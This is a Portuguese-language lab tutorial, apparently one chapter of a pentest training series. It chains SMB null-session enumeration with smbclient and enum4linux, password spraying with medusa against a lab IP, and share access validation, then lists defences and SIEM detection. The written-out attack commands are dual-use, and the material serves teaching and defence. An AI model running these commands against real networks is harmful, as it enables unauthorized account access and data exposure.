# 05 — Ataque em Cadeia: Enumeração SMB + Password Spraying

Um ataque realista raramente é um comando só. Este cenário encadeia **enumeração → construção de lista → spraying → validação**, simulando um **ambiente corporativo mal configurado**.

## Cenário

Uma rede interna com um servidor Samba (SMB) exposto, usuários previsíveis e uma política de senha fraca — situação comum em redes negligenciadas.

## 1. Enumeração SMB

Descobrir compartilhamentos e usuários antes de tentar senhas:

```bash
# Lista compartilhamentos disponíveis (sessão nula/anônima)
smbclient -L //192.168.56.101 -N

# Enumeração detalhada de usuários, shares e políticas
enum4linux -a 192.168.56.101
```

A enumeração entrega **nomes de usuários reais** — o insumo mais valioso para o próximo passo.

## 2. Montando a lista de usuários

Com os nomes enumerados, cria-se o `usuarios.txt` baseado em **dados reais**, não em chutes. Isso reduz drasticamente o número de tentativas necessárias.

## 3. Password spraying

Em vez de muitas senhas contra um usuário (que dispararia bloqueio), usa-se **poucas senhas muito comuns** contra **muitos usuários**:

```bash
medusa -h 192.168.56.101 \
       -U ../wordlists/usuarios.txt \
       -p 'Senha123' \
       -M smbnt \
       -t 3 -O ../evidencias/medusa-smb-spray.log
```

A lógica: uma senha padrão tende a estar válida em **pelo menos uma** das muitas contas, e como é só uma senha por usuário, não estoura o limite de tentativas.

## 4. Validando o acesso ao compartilhamento

```bash
smbclient //192.168.56.101/<share> -U <usuario>
```

Com acesso válido, confirma-se a leitura de arquivos no compartilhamento — o impacto final.

## Por que o ataque funcionou

| Fraqueza | Consequência |
|---|---|
| Sessão nula permitida | Enumeração de usuários sem autenticação |
| Usuários previsíveis | Lista de alvos "de graça" |
| Senha comum reutilizada | Uma senha abre várias contas |
| Sem bloqueio por tentativas | Spraying passa despercebido |

## Defesas diretas

- Desabilitar **sessões nulas/anônimas** no Samba.
- **Bloqueio de conta** e monitoramento de autenticações SMB.
- Política de senha que **proíbe senhas comuns**.
- Segmentação de rede para conter movimento lateral.

> 💡 O spraying é perigoso justamente por ser silencioso. A defesa não é só "bloquear por tentativa", mas **correlacionar** tentativas da mesma senha contra vários usuários — um padrão clássico detectável por SIEM.
